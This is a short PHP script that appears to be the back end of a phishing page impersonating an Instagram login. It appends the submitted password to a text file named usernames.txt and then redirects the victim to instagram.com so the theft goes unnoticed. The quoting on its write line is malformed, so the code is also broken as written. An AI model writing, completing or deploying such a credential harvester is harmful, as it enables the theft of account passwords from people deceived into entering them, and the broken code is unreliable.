<?php

file_put_contents("usernames.txt", "Username:holi.kry . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
